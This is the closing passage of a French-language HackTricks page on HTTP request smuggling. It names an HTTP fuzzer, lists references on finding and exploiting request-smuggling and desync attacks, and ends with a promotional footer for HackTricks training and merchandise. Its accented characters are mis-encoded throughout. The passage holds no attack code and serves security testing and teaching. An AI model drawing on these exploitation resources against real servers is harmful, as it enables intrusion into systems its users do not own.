* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP bas√© sur la grammaire utile pour trouver des incoh√©rences √©tranges dans le trafic de requ√™tes.

## R√©f√©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
